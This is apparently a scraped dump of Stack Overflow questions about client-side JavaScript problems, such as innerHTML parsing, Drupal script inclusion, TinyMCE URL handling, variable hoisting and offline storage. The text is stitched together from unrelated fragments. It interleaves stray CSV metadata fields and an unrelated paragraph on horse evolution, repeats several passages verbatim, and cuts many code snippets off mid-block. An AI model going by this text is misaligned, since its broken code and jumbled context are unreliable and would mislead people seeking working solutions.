Now if the PHP generatd xhtml/javascript is send to the client in a non-ajax way this works.  But when I send it as responseText and then update the DOM using .innerHTM it does not function.  Whatever mechanism that picks up javacript with in the XHTML does not seem to like the embedded javascript written into the .innerHTML property of the enclosing div tag.

Is there an easy fix for this?  Or do I have to construct the UI with in the javascript with out just inserting it all in an innerHTML...in a previous post someone mentioned that .innerHTML was not good practice.  Perhaps this is what they meant.

When I comment out the recursive call, my JSON looks like this:

          ""mtype"":""entry"",

          ""mtype"":""entry"",
          ""label"":""Git cheat sheet""
       }
    ]

When I uncomment the code, the JSON looks like this:

    [
       {
          ""id"":""16607"",
          ""mtype"":""entry"",

       }
    ]

I'm guessing this is the result of ignorance on my part about the finer details of how JavaScript handles scoping and recursion, but I'm at a loss as to what to do here.

Basically what i would like to do is pass an array my php code is generating to a separate js file which will do something with it.
Nothing new untill now, i suppose, so let me give you some clarification specific for my case. Let's say i am a bit ahead.

1)I found many answers that suggested to just pass the encoded version of my array echoing it out inside my php file and then retreiving it from the js separated file.

I was going to use this method but what i encountered is that i can't go for .getJSON() method because i have my encoded array inside a php file that outputs something more that just that.

So my final question would be: How can i retrieve, from my separated js file, my json_encoded version of the array from my php file?
And note again that i have my array echoed inside a div (occasionally made style=""visibility:hidden"" for the purpose of not showing it to the user).

Thanks in advance

It was so short and sweet, in fact, that it inspired me to try and simplify it even further (see code below). I've modified his original function such that it still passes all his tests and has the potential advantage of:

 - readability (50% less code)
 - simplicity (you don't have to be a ninja to understand it)
 - performance (no extra wrappers around super/base method calls)
 - consistency with C#'s base keyword

Because this seems almost too good to be true, I want to make sure my logic doesn't have any fundamental flaws/holes/bugs, or if anyone has additional suggestions to improve or refute the code (perhaps even John Resig could chime in here!).

  [1]: http://ejohn.org/blog/simple-javascript-inheritance/",javascript,inheritance,resig,oop,,,open,0,518,8,"Can simple javascript inheritance be simplified even further? John Resig (of jQuery fame) provides a concise and elegant way to allow [simple JavaScript inheritance][1].

It was so short and sweet, in fact, that it inspired me to try and simplify it even further (see code below). I've modified his original function such that it still passes all his tests and has the potential advantage of:

 - readability (50% less code)
 - simplicity (you don't have to be a ninja to understand it)
 - performance (no extra wrappers around super/base method calls)
 - consistency with C#'s base keyword

Because this seems almost too good to be true, I want to make sure my logic doesn't have any fundamental flaws/holes/bugs, or if anyone has additional suggestions to improve or refute the code (perhaps even John Resig could chime in here!).

I am doing a javascript effect. To do so I am pulling a node and it's children (including images) with .innerHTML. Then trying to parse it via the DOM. When it gets to the image tags it throws a parse error. When I alert the innerHTML I see that it is stripping the closing for the IMG tags.

I am not sure if the problem is with the parser or innerHTML. How can I take this node, grab the internal contents, parse it as XML?

Looks like a similar thing happened here: http://stackoverflow.com/questions/4244434/innerhtml-removing-closing-slash-from-image-tag

(This is the only page in the internet that I found that touches on this issue after almost two Days of searching.)


Here is the parse code I am using:

    function loadXMLString(txt) {
        if (window.DOMParser) {
            parser=new DOMParser();
            xmlDoc=parser.parseFromString(txt,""text/xml"");
        } else { // Internet Explorer

            xmlDoc.loadXML(txt); 
        }
        return xmlDoc;
    }

The resolution was to change the mime type, but how do you do that with the javascript parser (both MS ActiveX and the other browser's standard)? What mime should I use?

Here is the DOM Element I am attempting to parse:

    <div style=""display:none"" id=""ItemsContainer"" name=""ItemsContainer"">
        <SPAN>
           <a href=""url1""><img src=""1.jpg"" alt=""alt1"" /></a>

If I change the <IMG> tags to another name, like <IMA> then it works. It seems that innerHTML is breaking the <IMG> tag or that the parser can't parse IMG tags.

",javascript,css,,,,,open,0,533,4,"chanching visibility using javascript i have web page which uses ajax to retrieving data from another pages and while doing that i want to show a loading gif in the page so i've create a div with my gif on it.

here is my css code : 

    #content #loading {
    	position: fixed;
    	width: 48px;

but its not working weird thing is  if i create loading div visible and then turn it hidden at the beginning of ajax function it works fine !!!

I'm seeing some unsettling behavior between IE 8+, FireFox 12 and Chrome 18.0.1025.152m.

The short of it seems to be that ASPNetSpell cannot find the instance of CKEditor in Chrome, but in IE and Firefox it can.  

I have followed the recommendation in ASPNetSpell docs to integrate into ""all major HTML Editors including FCKEditor, CKEditor, TinyMCE..."":

My understanding is that when you set the Fields to ""EDITORS"" this instructs ASPNetSpell's client-side script to look for all IFrames.

The modal dialog does show in Chrome and I do see it make a request to the server, but when it returns to the dialog its behaving like there were no fields set to spell check.  IE and Firefox will behave this way when you have a typo in your Fields to check.

****What i want is ...****

**I want to make that hard coded value as dynamic, and for that i want to create a dropdown list by select tag as example:**

    <div id=""settingPageSize"" align = ""left""><select id=""pageCount"">
    		<option value=""50"">50</option>
    		<option value=""100"">100</option>
    		<option value=""150"">150</option>
    		<option value=""200"">200</option>
    		<option value=""250"">200</option>
    		<option value=""500"">200</option>
    	</select></div>

and on the place of pagesize value (1000) i will call a JavaScript method that will give us   the value of selected item from drop down list by returning to place of calling as we called javaScript method from the pagesize so dynamically value will be set out there.

**As example Java Script method is:**

    /* Return the value selecte from the drop down list */
    	function selectPageSize() {
    	    var selectBox = document.getElementById(""pageCount"");
    	    var selectedValue = selectBox.options[selectBox.selectedIndex].value;
    		return selectedValue;
    	   }

and in <disply:table> i will **set pagesize = ""selectPageSize();""**

But it is not working properly
Tell me the problem 
And give me any other solution if you have.
Thanks in Advance

If the user clicks the save button on the entity form it calls the save call on the iFrame. This all works well. The problem I have is that the iFrame never refreshes. 

I added code to the iFrame that refreshes the entity form when it is done working.

    window.parent.location.reload()
When this is done and the entity form is reloaded the iFrame still hasn't updated. 

I tried using javascript on the OnLoad event of the entity form to reload the iFrame page, this still doesn't refresh it. I used 

    crmForm.all.IFRAME.contentWindow.location.reload(true) 
and 

    crmForm.all.IFRAME.contentWindow.navigate(url)
but neither worked.

If I put the aspx page into a normal external iFrame it refreshes as expected when the page reloads so there must be something in CRM that is causing it to look at an old version of the page.

If I right click on the iFrame and click refresh then it reloads the page with the expected results.

    function drawTiles(tiles) {
        var x, y, tile;
        for (x = 0; x < width; x++)
            for (y = 0; y < weight; y++) {
                tile = tiles[y][x];
                if (tile)
                    drawTile(tile, x, y);
            }
    }

This makes sense because variables in JavaScript are hoisted to the top of the function and function scoped anyway.

However, I get the impression that it is more popular to just declare them when first used, like this:

    function drawTiles(tiles) {
        for (var x = 0; x < width; x++)
            for (var y = 0; y < height; y++) {
                var tile = tiles[y][x];
                if (tile)
                    drawTile(tile, x, y);
            }
    }

That's actually easier to work with IMO - you don't have to jump to the top of the current function whenever declaring a new variable. But it doesn't feel ""right"".

My question is: Which style is more popular among professional (and popular) JavaScript programmers? (I usually try to pick the most common code style used in the community)

I had a look at a few open source projects (Google's [Closure][2], Facebook's [Phabricator][3], [Facebook JS SDK][4] and [jQuery][5]) and it seems all (except jQuery) declare variables when first used most of the time. jQuery leans towards declaring them at the top of functions, but by no means consistent.

            for (y = 0; y < weight; y++) {
                tile = tiles[y][x];
                if (tile)
                    drawTile(tile, x, y);
            }
    }

This makes sense because variables in JavaScript are hoisted to the top of the function and function scoped anyway.

However, I get the impression that it is more popular to just declare them when first used, like this:

    function drawTiles(tiles) {
        for (var x = 0; x < width; x++)
            for (var y = 0; y < height; y++) {
                var tile = tiles[y][x];
                if (tile)
                    drawTile(tile, x, y);
            }
    }

That's actually easier to work with IMO - you don't have to jump to the top of the current function whenever declaring a new variable. But it doesn't feel ""right"".

My question is: Which style is more popular among professional (and popular) JavaScript programmers? (I usually try to pick the most common code style used in the community)

I had a look at a few open source projects (Google's [Closure][2], Facebook's [Phabricator][3], [Facebook JS SDK][4] and [jQuery][5]) and it seems all (except jQuery) declare variables when first used most of the time. jQuery leans towards declaring them at the top of functions, but by no means consistent.

Hey I'm working on a startup and I've got to build a simple database using Node.Js and Mongo (front end is HTML5/webGL). Basically we've got some investors lined up but before we pull the trigger I want to show them some server interaction. I do graphic design/business side and my partner is the technical side, but because we're both moonlighting time is limited and I need a backend asap. Last 24 hours I've gotten pretty familiar with Node.JS and Mongo and done a few tutorials, and I basically need to bring it together now and develop the schema and actually start building my database (please excuse me if terminology is off, I'm new). 

I'm looking for some resources/intro/tutorials/direction on this part and I was wondering if you guys have some suggestions, links, youtube, whatever. Any help is appreciated. Thanks.

The problem:

 * I can't use a transparent `div` sized to include both the `span` and the button, because if the `div` is above the span, it blocks the `click` event, and if I use the `z-index` to place the `div` below the paragraph, it doesn't seem to receive the `mouseleave` event at all.

I could probably cludge something together with `mousemove` on the entire paragraph, but that seems really ugly. I don't think I can use some kind of coordinated event handling to check `mouseleave` on both the `span` and the `button`, because there's space between them.

So here are some of the anti-patterns:

<pre>
1. Polluting the namespace by defining a large number of variables 
in the global context

2. Passing strings rather than functions to either setTimeout or setInterval as 
this triggers the use of eval() internally.

3. Prototyping against the Object object (this is a particularly bad anti-pattern)

4. Using JavaScript in an inline form as this is inflexible

5. The use of document.write where native DOM alternatives such as document.createElement 
are more appropriate. document.write has been grossly misused over the years and
has quite a few disadvantages including that if it's executed after the page
has been loaded it can actually overwrite the page you're on, 
whilst document.createElement does not. 
You can see here for a live example of this in action. 
It also doesn't work with XHTML which is another reason opting 
for more DOM-friendly methods such as document.createElement is favorable.
</pre>

So my question would be: Do you have any real examples of code of these Anti-patterns?
I reckon that could go into StackOverflow wiki as a valuable material.

I have a javascript slideshow that uses setTimeout() i understand that in chrome and some FF that it will speed up if you open a new tab and then return to the page running the script then it will speed up to catch up to where it thinks it should be. However in doing this it not only speeds up but also ignores some of the questions in my code to jump out of my image array causing a brief undefined error. Once it catches up it then runs fine??? im stuck any ideas how i can get round this? this is the code im using.

Here's a sample of the array (shortened from 6000+ rows to 2):

    var database1=[[

        etc,etc,etc...]];

When I append database1.js to the head on the container the memory used for IE in windows jumps from 7,7MB to 21,9MB. This is fine, I can now loop though the array called database1 (first row and column is at database1[0][0]).

The problem is that I need to re-append the database file from time to time and in doing so the memory usage increases (I thought the database array would be overwritten).

So the first re-append pushes memory usage in IE up to 30,4MB but then continues to increase on each re-append: 30,4MB > 33,9MB > 39,5MB > 42,1MB etc.

To prevent this from happening I now clear each item in the array before I re-append the database1 file.

    for ( var i=0, il=database1.length; i<il; i++ ){
	delete database1[i];
    }
    //append database1.js to head code here

*This does help*. The memory usage doesn't decrease to the initial 7,7MB but does however decrease from 21,9MB to 14,1MB. The next re-append increases the memory to 25,9MB (clearing with the loop: 18,8MB). The next re-append increases the memory to 29,3MB (clearing with the loop: 24,5MB).

Description: Bare with me here. I don't think the issue is with tinymce and it's probably the fault of IE8, but I need help from someone wiser than me in solving the final piece of the puzzle to figure out who is responsible for this...

So basically I'm using tinyMCE with Visual Studio 2010 and I get the problem as described above. So I switch to the tinyMCE source code to debug this. The problem seems to happen in this piece of the code in the inlinepopups/editor_plugin_src.js, line 358:

    	var i, n, t = this, dom = tinymce.DOM;

    	    te.appendChild(dom.doc.createTextNode(ne));
    	else if (ne.length) {
    	    te = te.appendChild(dom.create(ne[0], ne[1]));
    
    	    for (i=2; i<ne.length; i++)
    		t._addAll(te, ne[i]);
    	}
    },

the exact line of code being, 

te = te.appendChild(dom.create(ne[0], ne[1]));

In IE8 te becomes null because te.appendChild returns nothing.

To give some background on the the code, te is a DOM.doc.body object and ne seems to be a json object containing the structure of the inline popup object that needs to be created.

So back to the code.. this works with all other browsers no problem. So I step into the function appendChild and I'm brought to some ""JScript - script block [dynamic]"" file that does the unthinkable. It overrides the doc.body.appendChild function... You can see it below,

Here we can obviously see what went wrong. Of course te.appendChild returns nothing... it has NO RETURN STATEMENT!

    $(""li"").live(""click"",function(e) {
        alert($(this).next(""li"").attr('id'))
    });

When you click an li it will display the ID of the next li.

But how do you display the ID of the next li's, next li?

    For example,
    
    If I have:
    
    1 2 3 4 5 6
    
    And I move the number 2 to make:
    
    1 3 2 4 5 6
    
    
How do I return that the ""next"" value to 1 has changed to 3, the ""next"" value to 3 has changed to 2, and the ""next"" value to 2 has changed to 4?


I am asking because I need to be able to identify these values and store them in a database so that I can load the page and echo the li's in the correct floated order using PHP if they are rearranged. I will be using ajax of course to send these values to a PHP page.

Here is the document:

http://jsfiddle.net/TSM_mac/uuHsg/2/




Also, I am using alert(something...) to display the results.

Is there any type of ""onrelease"" or similar command that will only display the values after the objects are rearranged?

Thanks tons,

    var t_millis = d.getTime();

(Since d is in GMT as well. *Unless* getTime() does a sort of implicit time zone conversion, i. e. adding the offset *BEFORE* giving out the milliseconds, but I've never read about that anywhere) 

So is there really no other way than adding the offset to the time value?

However, I really don't understand how I can insert this in my javascript. I managed to display an alert box by adding this line at the end of my javascript:

     window.addEventListener( ""compose-window-init"", prep_mail(), true ); 

The ""prep_mail"" function is defined like this:

    function prep_mail() {
    	alert('prep_mail');
    	gMsgCompose.RegisterStateListener(myStateListener);
    	alert('prep_mail2');
    }

I only see the ""prep_mail"" alert, not the second one.

Does anybody have a solution?
Thanks a lot

Take viewport map limits in borders for NorthEast and SouthWest, not for viewort Center, because in small zoom (when always centering by map.getCenter() ) we can see a lot of unwanted teritories.

I thought in two ways:

**First version**

 - For small zoom do calculaitions with NorthEastSouthWest viewport
   bounds, and pin them to the borders if we go out;
 - For large zoom as was, counting with map.getCenter(), couse maybe we
   want to see location in the center.

**Second version**

 - Set a a variable that will make limits smaller depending of zoom
   level. If zoom is larger, than limits are more close to origin. If
   zoom is smaller than we make limits smaller. And maybe that variable
   must be relative to bounds limit size.....

In first version will be much of ""if`s"", we must check each of viewport borders, if any gets out of limits to fit it to border limit... 
I tried to do that, but im alwais doing smth wrong!!! And having a fiasco every time :(

Yes, I know there are a __lot__ of JS/jQuery programs out there to do this. I'm currently using http://www.kryogenix.org/code/browser/sorttable/sorttable.js . It's very easy: just a JS file, add a few class attributes to your table, and you're off. In particular, you don't actually need to know JS to use it, and you can add custom sort keys without needing to write your own JS to extend it. I like it a lot for those two reasons. The main problem: my table is ~9300 rows long, and sorting takes 10-20 seconds. So I'm wondering, are any other scripts out there faster than this? These are the ones I've found:

http://webfx.eae.net/dhtml/sortabletable/sortabletable.html (Not even sure what this uses)  
tablesorter.com/docs/ (Really really nice, but not easy to extend, requires knowing JS/jQuery)
flexigrid.info/ (Overkill, I just need a table sorter, not a whole data manipulation program)  
datatables.net/ (Overkill, requires Js/jQuery to extend)

I'm sure there's 5000 other programs that can do what I want, but I don't have the time to figure out and test them all to see if they're fast. Thus I'd like to know if someone out there on StackOverflow can point me to whichever library they know to be fast, so I only have to figure out how to use one program.

The instructions ask you to put a `script` block and `script` link into the `HEAD` of the page to get it all working. That's fine. It's a great tool.

But what if i wanted a bookmarklet-like way of just ""inserting"" it into any page. I don't see why this can't be done.

This is my bookmarklet:

    javascript:(function(){document.body.appendChild(document.createElement('script')).src='http://url-to-js-file.js?x='+(Math.random());})();

Note that the `src` property there originally was ""/ipd/ipd.js"" like the instructions suggest. But it will need to be absolute like this if i want to get the debugger working with other sites.

**My problem is** that this code will dump the first js file (url-to-js-file.js) into the page ok but when the first file tries to insert the other successive files my page appears to redirect. In fact it does not redirect but just get rewritten. Firebug shows the resulting page as no body but just the ipd js files in the `HEAD` element.

Why does it do this?

Is it because of the [bookmarklet behavior][3] that normally redirects to a new page? I don't think so. Because i'm using a closure in the bookmarklet link. And when i comment out the `document.body...` line of the ""url-to-js-file.js"" file the page stays where it is. Is it the nesting? Or may it be something in the other ipd js files causing this?

I've tried putting my ""url-to-js-file.js"" code into a closure but then the global var `ipdConfig` becomes invisible to the rest of the ipd code which breaks it.

Any ideas?

However, several hours have been spent today between me and my buddy trying to find a way to override the built-in CSS and how to integrate the JavaScript. 

I saw pages telling me to just put <head> and <script> tags in the Source Code for the page/node I was trying to build:

    <head>
    <script src=""sites/ctd-dev.jdc.ao.dcn/files/ctools/galleryJavaScript.js.txt"">
    </script>
    </head>

I saw pages telling me to use a php tag to incorporate the JavaScript code into the page, much the same way it would be in a <script> tag in a normal HTML page:

    <?php
    function switchImg(i){
    document.images[""awesome""].src = i;
    }
    ?>

I even tried just plain old calling the .js file into the page using what I believe is called a module:

    <?php
    drupal_add_js('sites/ctd-dev.jdc.ao.dcn/files/ctools/galleryJavaScript.js.txt', 'external');
    ?>

Fun fact, guys: Drupal is dumb. None of those worked, and every single thing I find with my Google-fu is some variation of those three choices. Are any of you particular masters with Drupal? If you can help me solve this problem, I swear on my own life that I will bake and ship to you a batch of my grandmother's famous chocolate chip cookies.

I'm losing my mind. I just want to add some CSS and JavaScript so I can impress the guy who gave me my internship :/",javascript,html,css,drupal,integration,05/12/2012 15:37:28,off topic,1,2332,15,"How do I implement CSS + JavaScript scripts on specific pages on our Drupal site?

The horse has evolved over the past 45 to 55 million years from a small multi-toed creature into the large, single-toed animal of today. Humans began to domesticate horses around 4000 BC, and their domestication is believed to have been widespread by 3000 BC. Horses in the subspecies caballus are domesticated, although some domesticated populations live in the wild as feral horses. These feral populations are not true wild horses, as this term is used to describe horses that have never been domesticated, such as the endangered Przewalski Horse, a separate subspecies, and the only remaining true wild horse. There is an extensive, specialized vocabulary used to describe equine-related concepts, covering everything from anatomy to life stages, size, colors, markings, breeds, locomotion, and behavior.';

However, several hours have been spent today between me and my buddy trying to find a way to override the built-in CSS and how to integrate the JavaScript. 

I saw pages telling me to just put <head> and <script> tags in the Source Code for the page/node I was trying to build:

    <head>
    <script src=""sites/ctd-dev.jdc.ao.dcn/files/ctools/galleryJavaScript.js.txt"">
    </script>
    </head>

I saw pages telling me to use a php tag to incorporate the JavaScript code into the page, much the same way it would be in a <script> tag in a normal HTML page:

    <?php
    function switchImg(i){
    document.images[""awesome""].src = i;
    }
    ?>

I even tried just plain old calling the .js file into the page using what I believe is called a module:

    <?php
    drupal_add_js('sites/ctd-dev.jdc.ao.dcn/files/ctools/galleryJavaScript.js.txt', 'external');
    ?>

Fun fact, guys: Drupal is dumb. None of those worked, and every single thing I find with my Google-fu is some variation of those three choices. Are any of you particular masters with Drupal? If you can help me solve this problem, I swear on my own life that I will bake and ship to you a batch of my grandmother's famous chocolate chip cookies.

I'm losing my mind. I just want to add some CSS and JavaScript so I can impress the guy who gave me my internship :/",5

</code></pre>",javascript,html,css,table,,,open,0,12095,28,"How do I link h-scroll, of a table header, with the h-scroll of a table body, without linking the v-scroll of the table body, with the table header? Basically, what I would like is a fixed header, frozen pane, table, such as, http://www.cssplay.co.uk/menu/tablescroll.html.  However, his tables have one key weakness.  The header will not scroll horizontally with a body.

Here is a sample, based off the link above.   However, the header clearly does not scroll left and right with the body of the table.

This so far I have. Now what I want to do is whenever a list is hovered that has a nested list (for example *Earrings*). I want the nested list to be revealed like so:


![alt text][2]

Notice what all is going on here, its not just telling the nested list to be displayed, that would not look right. Its putting them in a block between the first level lists where they wrap (between ""Sports Jewelry"" and ""Charms"").

I am not sure how to go about this.

Any ideas?

This page alerts 0.0.0 when I disable Flash. That's what I want.

If i copy the source code from the page above, and run it from my desktop - it works fine. I then try to use the same code, but on my IIS, and it gives me the installed version, even though it is disabled. Could it have something to do with MIME-mapping?

The reason of upgrade was some problems with third-party plugin (spellchecker) - after trying with newer version those problems were fixed and on developers env. everything was working ok.
The problem occured on live env (after delivering new version of app to client), on client side, you can connect to app (using tiny mce) in two ways:

(1) type address (so normal way, everything works ok)

(2) using some kind of portal - client app, that modifies urls for some reasons I don't know - using this way Tiny mce stopped working after upgrade to (3.4.2). (I've double checked and this is related only with tiny mce version update, not with plugins or other issues).

The way that clients portal converts urls looks like this:
non-converted url:

http://server.address/blabla/js/jsFileName.js?v=123

converted url (grabbed from fiddler):

https://client.portal.com/http://server.address/blabla/js/jsFileName.js?v=123&psScriptReferrer=http://server.address/blabla/

As I told before, the 'old' version (3.2.6) was working ok (even with those magically converted urls), problem occured after update tiny mce (no changes to configuration or anything else). The error I'm getting is:

    q is not a constructor

I get this eror on all browsers (checked on: IE6/IE8/FF3.6). This also results in tiny mce not loaded (only 'plain-html' text input is displayed).

My assumption is that new version included some regexps, and magically converted link contains more than one 'http' string.

I've tried some changes for the following parameters (setting them to 0) - no luck:
convert_urls : 1,
relative_urls : 1,
remove_script_host : 1

it is also one more 'promissing' parameter:
document_base_url : tinymce.documentBaseURL

but since this app should be working using two ways described above (1) and (2), I cannot just hardcode the link there (also this sounds like a very fragile solution).

I cannot 100% sure say that this is a bug in tinymce, because using 'normal' address everything works ok. On the other hand, I cannot do anything with those url conversion.

I have a compressed thread comment hack script from a tutorial that I put directly on the template. I hope I can remove it and store it into an external file, because I don't like messy code. I've done it but somehow this script not work. I thought if I could decompress it, this script can work when stored in the external directory.
I also have changed all this symbol:

    &quot; &#39; &lt; &gt; &amp;

with this symbol:

    "" ' < > &

Or if it can't be decompressed, can I make this script work when I save it in an external directory?
Thank's for your help.

I am trying to understand best practices and patterns for client side JavaScript development. In particular, what do you do to manage more complex data models on the client? 

As an example, say you where managing some sort of store catalog online, and had a Product, with it’s pretty typical properties: { id, description, price, etc… }. But the product also has a set of categories that it could be associated with, and therefore two more lists needed to be fetched: AvailableCategories and AssociatedCategories. Of course, to make matters more complex, your association of categories to tables is not a simple join, but has meta-data like a scalar number from 1-10 that describes how strongly associated the product is to the category. And then say there are four or five other associations, of which one has an “Available” table that might require paging (for instance, maybe you associate the product with something that has a million items in the table, and you want to pull down only 100 of them at a time, searchable and sortable, of course).

My point is, there are lots of models, along with join associations with meta information, some data can be pre-fetched or statically downloaded on the page load, while some has to be dynamically fetched. And of course, you don’t just want the base models, but “observables” as well, so that if someone chooses a color to associate with your product, you would be notified (for free) someplace else on the page of the changes.

I am thinking of moving to a client side MVC framework, like SproutCore, but would like to see some lighter weight options and patterns. I would appreciate hearing what you use, why you use it, and any other thoughts on this problem space.

Thanks.

The code below uses  target=""_blank"" in the <form> tag - which seemed like the simplest solution - but that doesn't work in this instance - not sure why, but thought it may have something to do with the dynamically-built URL.

I tried several methods gleaned from previous similar questions on this site, the method below being one of them, as well as something along the lines of

Or is this considered micro-optimization especially when using a platform like for example node.js. Should I consider performance over information hidding or not?

---

By reading  [Douglas Crockford's article about information hidding][2] I know I can add private members and privileged methods. But according to this quote from Douglas Crockford the prototype mechanism helps you conserve memory:

> When a member is sought and it isn't found in the object itself, then
> it is taken from the object's constructor's prototype member. The
> prototype mechanism is used for inheritance. It also conserves memory.

When only memory is saved then I guess this might not be such a big deal because memory is getting cheaper by the second. But according to [this article from John Resig][3] it is also faster(CPU) to add a lot of properties the prototype chain.

This  also might not be such a big problem because CPU's are getting much faster(Moore's Law). Furthermore because the Javascript engines made incredible progress performance-wise I am wondering if I should even consider this or just use information hidding.

Or is this considered micro-optimization especially when using a platform like for example node.js. Should I consider performance over information hidding or not?

---

By reading  [Douglas Crockford's article about information hidding][2] I know I can add private members and privileged methods. But according to this quote from Douglas Crockford the prototype mechanism helps you conserve memory:

> When a member is sought and it isn't found in the object itself, then
> it is taken from the object's constructor's prototype member. The
> prototype mechanism is used for inheritance. It also conserves memory.

When only memory is saved then I guess this might not be such a big deal because memory is getting cheaper by the second. But according to [this article from John Resig][3] it is also faster(CPU) to add a lot of properties the prototype chain.

I was looking through the source for a small framework and noticed something that I found odd. The framework defines some global functions, and then calls those functions from within the object's functions. To clarify, here's an example:

    var MyObject = function() {
    
        function MyObject() {
            this.x = 5;

I tried few methods but it crashed. Infinite looping. Maybe logical error. Ya, perhaps you noticed, I am totally new to programming. Give me some explanation with example would be appreciated.

The process works if I create the rows via CakePHP view, but if I use jQuery the data isn't saved, I've checked differences between the code generate via CakePHP and the code duplicated via jQuery without see something important:

 - The orange player doesn't know what it's trying to play
 - I don't think the nicely implemented play one/pause other feature of their demo is working, but I can't tell. There's no reason it should because I haven't written it to anywhere as I can't work out where.

4700988,01/15/2011 17:21:10,314118,04/11/2010 23:02:36,1,0,"Nested literals in JavaScript, a good idea?","I stumbled upon a pattern in JavaScript that I refer to as a `nested literal'. It works because you can have self invoking function literals as arguments of self invoking function literals.

A self invoking function literal is a function that immediately evaluates itself, like so:

    (function(arg1, arg2) { return arg1 + arg2; }) (1, 2);

This is equivalent to writing

    3;

One advantage of using such self invoking function literals is that its code is strictly top-down, which makes it very easy to understand. Consider

    document.write(
        (function(
            factorial,
            square
        ) {
            return factorial(square(3));
        } (
            function f(x) {
                if (x <= 1) return 1;
                else return x * f(x - 1);
            },
            function f(x) {
                return x*x;
            }
        ))
    );

Assuming you recognize the argument of document.write() as a self invoking function literal, you don't have to be very smart to understand that this program writes the factorial of the square of three to a page, and to understand how the factorial and square functions are implemented. The program reads intuitively as ""in the document, write the factorial of the square of 3, where factorial is ... and square is ... ."".

What's more, there is nothing from stopping you of making one of the arguments of a self invoking function literal such a function literal itself. For example:

    (function(arg1, arg2) { return arg1 + arg2 }) (
        1,
        (function(arg1, arg2) { return arg1 + arg2 })(2, 3)
    );

This is equivalent to writing

    6;

This nesting can go on and on, allowing you to make extremely complex literals that are very simple to understand. Consider the final program: 

    document.write(
        /* text = */ (
            (function(
                title,

I think it is obvious what it does. You can run it by clicking in text field of your adress bar, typing 'javascript:', pasting the above source code and pressing enter.

What I am unsure about is how efficient the use of nested literals is. I wonder if you would run into any trouble if you would take this to the extreme. I am wondering if anyone knows.

Anyway, I just wanted to share this, perhaps hear what you think.

Regards, Pieter Jan",javascript,design-patterns,,,,01/16/2011 17:31:40,not a real question,1,3065,7,"Nested literals in JavaScript, a good idea? I stumbled upon a pattern in JavaScript that I refer to as a `nested literal'. It works because you can have self invoking function literals as arguments of self invoking function literals.

A self invoking function literal is a function that immediately evaluates itself, like so:

    (function(arg1, arg2) { return arg1 + arg2; }) (1, 2);

This is equivalent to writing

    3;

One advantage of using such self invoking function literals is that its code is strictly top-down, which makes it very easy to understand. Consider

    document.write(
        (function(
            factorial,
            square
        ) {
            return factorial(square(3));
        } (
            function f(x) {
                if (x <= 1) return 1;
                else return x * f(x - 1);
            },
            function f(x) {
                return x*x;
            }
        ))
    );

Assuming you recognize the argument of document.write() as a self invoking function literal, you don't have to be very smart to understand that this program writes the factorial of the square of three to a page, and to understand how the factorial and square functions are implemented. The program reads intuitively as ""in the document, write the factorial of the square of 3, where factorial is ... and square is ... ."".

What's more, there is nothing from stopping you of making one of the arguments of a self invoking function literal such a function literal itself. For example:

    (function(arg1, arg2) { return arg1 + arg2 }) (
        1,
        (function(arg1, arg2) { return arg1 + arg2 })(2, 3)
    );

This is equivalent to writing

    6;

This nesting can go on and on, allowing you to make extremely complex literals that are very simple to understand. Consider the final program: 

    document.write(
        /* text = */ (
            (function(
                title,
                section1,
                section2,
                section3
            ) {
                return ('<h3>' + title + '</h3>' +

When they come back into the office they can sync/upload the data back to the server. The reason it needs to be HTML5 is so it's platform agnostic, ie can run it on iOS, Android etc as long as it has a modern web browser that supports HTML5.

Now I've already built the system using HTML5 local storage (for the data) and the HTML5 offline application cache (for the pages/css/js/images) and it works reasonably well with small datasets (I can view, edit and save while offline and load/sync while online). Now I need to scale up to 10,000 rows of data. So I've been researching a few options.

1) WebSQL: Would be able to query the data using SQL language and do joins etc. Problem is it's now deprecated an won't be supported any longer so I don't want to invest time building something for it.

2) IndexedDB: Uses an object store (which technically I'm already storing objects using local storage API and storing using JSON). There's lots of boilerplate code to do simple tasks like creating the database, adding to it, reading from it, iterating over it. Needlessly complex API interface. I just want to do a simple query like `select(xyc, abc).where(abc = 123).limit(20)` but instead have to write a lot of JavaScript code to do it. Better yet how do I write my own code to do joins between tables?

Ultimately I feel they dropped support for Google Gears and WebSQL prematurely as IndexedDB is still in draft stages and only Firefox and Chrome have support for IndexedDB so far. Why deprecate everything when the finished standard/widespread support is still months/years away? What are people supposed to use in the meantime?

I've looked at the possibly using the asp.net list view control but as far as I can tell the client side api isn't that great so I'd need to write a significant amount of client side code.  Any suggestions on a way to do it better?  Thanks

I have a reader application that needs to be made, on the page it will have the Table of Contents on the left side and the actual content of the book on right.  The TOC content shows chapters and sections within the chapter.  The content on the right will only shows one of those sections at a time, no preloading the whole book.  When you click on the section in the TOC, makes an API call to a separate server that holds all the book data and returns the HTML to be displayed in the content section. 

I want to know if there is a way to make the application to use both unobtrusive javascript and active resource. Active resource would handle the interaction between the Rails Application and the server that holds the book content.  The unobtrusive javascript would be the controller between the table of contents and the content on the right.

I guess what I'm wondering most of all, beyond just its possibility, is if I can integrate this is such a way that I don't need to make unnecessary api calls.  Currently, I can't figure out how this would work without it making an api call to rails then making another api call to the book content provider.

Through a Javascript request, XMLHttpRequest responds with some additional Javascript that needs to be executed on the requesting page.

Using eval(), if the response is something like:

    alert('This is the js response');

... then this works just fine.

However, the text returned will look something like this:

<script language=""javascript"">var checkVar='checkVar: value 1';</script>

I have ensured that the XMLHttpRequest is synchronous, as I want to reference checkVar right after this.

So:

    <script type=""text/javascript"" src=""http://www.mysite.com/setCheckVar.js"" />

    <script type=""text/javascript"" >
        alert('checkVar');
    </script>

The alert message should read ""checkVar: value 1"".

For other reasons, this is not just as simple as setting *var checkVar* in setCheckVar.js, so I'm not looking for that kind of recommendation.  

I suppose that I could strip out the beginning and ending script tags and keep the eval() way of doing it.  However, I would like to know if there are any solutions that support what I'm looking for?


Thanks.

I have a calculator that determines a price based on the amount of items the customer specifies. 

Once the customer clicks calculate, two values are shown on that page:

Installed price

and

Not Installed price

The user then clicks buy now and the values are sent to a second page via post. 

That page has 2 buttons with the values of the previous pages amounts. 

Both buttons have the same name ""amount"" because my next page (the credit card checkout) shows what ever amount they selected. And the variable to that cart field is ""amount""

also a hidden field of ""qty"" is sent form page 2 to show the total number of items they ordered. (its only one item type they are purchasing).

I need a javascript on that second page. 

When the user clicks whichever price (button, installed or not installed) , the javascript needs to do two things :

1. Calculate a sales tax of 6% (to be sent to final order page)
2. add a delivery cost of $10 unless the amount is over $50. (before tax price is added)
 
I need to post the price to the last page still as the ""amount"" as it currently does now, but I need to add a field to the final page that shows the delivery fee field ONLY if the delivery fee applies, other wise the amount should be $0.00

